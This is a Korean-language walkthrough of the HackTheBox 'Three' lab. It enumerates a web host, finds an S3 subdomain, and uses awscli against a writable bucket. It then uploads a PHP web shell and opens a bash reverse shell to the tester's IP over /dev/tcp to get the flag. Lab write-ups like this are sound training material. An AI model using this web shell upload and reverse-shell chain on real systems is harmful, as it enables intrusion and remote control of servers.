# Three - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA three 10.129.7.142
```
<img width="1102" height="389" alt="image" src="https://github.com/user-attachments/assets/d764c32d-65ed-477d-8c6c-548f35fb70e9" />

- SSH(22)
- HTTP(80)
---
## banner grabbing
```bash
whatweb http://10.129.7.142

curl -IL http://10.129.7.142
```
<img width="1107" height="241" alt="image" src="https://github.com/user-attachments/assets/6f8fbcec-4a15-493e-b95e-0c315cc0a741" />

<br>
<br>

- `whatweb`에서 `thetoppers.htb`도메인을 발견하여 `/etc/hosts`에 추가해줌.
<img width="1011" height="150" alt="image" src="https://github.com/user-attachments/assets/763d1ba5-4bd0-4c13-b82c-0fdde16b0e2f" />

---
## HTTP(80)
- `gobuster`로 directory를 찾아보았으나 특별한 정보가 없음.
```bash
gobuster dir -u http://thetoppers.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,md
```

<br>

- `ffuf`로 vhost를 확인하기 위해서 시도했으나 처음에는 정보가 없었음.
 - `ffuf`의 기본 세팅이 404 오류를 반환하지 않는다는 것을 확인하게 됨.
 - `404` : 서버 자체에는 존재하지만 서버에서 요청한 것을 클라이언트에 반환하지 못해서 나오는 오류.
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -H 'Host: FUZZ.thetoppers.htb' -fs 11952
```
<img width="1107" height="220" alt="image" src="https://github.com/user-attachments/assets/4d794202-8237-41db-b5d7-b9d65dba3d1d" />

<br>
<br>

- `-mc all`옵션을 붙여서 다시한번 실행해봄.
- `s3.thetoppers.htb` 발견
- `s3.thetoppers.htb`의 루트 경로는 `404`를 반환하지만, `/etc/hosts`에 `s3.thetoppers.htb`를 등록한 후에 브라우저로 접속이 가능한 것을 확인
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb -H 'Host: FUZZ.thetoppers.htb' -fs 11952 -mc all
```
<img width="1107" height="88" alt="image" src="https://github.com/user-attachments/assets/5fc7c88f-8048-4498-af74-63063f288c3f" />
<img width="1011" height="46" alt="image" src="https://github.com/user-attachments/assets/a7191126-da12-4d54-9fcc-fe036d11edfc" />

---
## awscli
- `s3`는 `aws`에서 사용되는 서비스 중 하나라는 것을 캐치하여, awscli를 사용해봄.
- 접속할 수 있는 정보를 알 수는 없어 임시로 configure를 구성함.
<img width="1011" height="135" alt="image" src="https://github.com/user-attachments/assets/319c11d3-db8f-446f-be23-09828f4669de" />

<br>
<br>

- `awscli`의 경우 기본적으로 `aws`서버로 요청을 보내기에, 발견한 endpoint `s3.thetoppers.htb`로 변경해주면서 어떤 경로에 접근가능한지 확인해봄.
```bash
aws s3 --endpoint-url=http://s3.thetoppers.htb ls
```
<img width="561" height="81" alt="image" src="https://github.com/user-attachments/assets/7fb29d86-60a1-4183-ba12-3e7440f26300" />

<br>
<br>

- `thetoppers.htb` 내부도 확인.
```bash
aws s3 --endpoint-url=http://s3.thetoppers.htb ls s3://thetoppers.htb
```
<img width="750" height="121" alt="image" src="https://github.com/user-attachments/assets/a64b4be8-4376-47da-be38-c711c913ce0e" />

<br>
<br>

- `index.php`를 로컬에 복사해 와서 확인해보니 접속했던 `http://thetoppers.htb`의 `index.php`와 동일한 파일임을 확인할 수 있었음.
```bash
aws s3 --endpoint-url=http://s3.thetoppers.htb cp s3://thetoppers.htb/index.php .
```
<img width="870" height="81" alt="image" src="https://github.com/user-attachments/assets/d791432d-81ae-4791-abe0-fc5d46b6e2c5" />

---
## Upload webshell
- `s3`에 웹셸이 업로드가 되는지 확인하기 위해서 웹셸 복사해옴.
```bash
cp /usr/share/webshells/php/simple-backdoor.php .
```
<img width="546" height="68" alt="image" src="https://github.com/user-attachments/assets/aaa3f3e5-d952-4857-a3d3-5cec09cc1153" />

<br>
<br>

- `s3`에 웹셸을 업로드.
```bash
aws s3 --endpoint-url=http://s3.thetoppers.htb cp simple-backdoor.php s3://thetoppers.htb/
```
<img width="947" height="68" alt="image" src="https://github.com/user-attachments/assets/4f6a0235-e0bc-42ff-8455-d0316878fef1" />

<br>
<br>

- 업로드 확인.
```bash
aws s3 --endpoint-url=http://s3.thetoppers.htb ls s3://thetoppers.htb
```
<img width="947" height="128" alt="image" src="https://github.com/user-attachments/assets/6b6f54c8-e2f0-4406-8e75-636285424c8f" />

<br>
<br>

- 브라우저에서 접속시 웹셸이 정상 작동 되는 것을 확인.
<img width="841" height="86" alt="image" src="https://github.com/user-attachments/assets/1d39615a-e19b-4027-85e3-95426bb8880c" />

<br>
<br>

- burpsuite를 통해서 reverse shell 연결 시도
```
bash -c ‘bash -i >&/dev/tcp/10.10.14.240/80 0>&1’
```
<img width="767" height="319" alt="image" src="https://github.com/user-attachments/assets/c2435169-6ca9-4d35-9f3f-8866c58edea4" />

<br>
<br>

- reverse shell 연결 성공
<img width="798" height="201" alt="image" src="https://github.com/user-attachments/assets/c00aa670-1190-4700-b699-452ee2677990" />

---
## flag.txt
- `/var/www`에서 flag 획득
<img width="798" height="137" alt="image" src="https://github.com/user-attachments/assets/7d461b0e-4a4b-40df-97a3-08ce6210b914" />

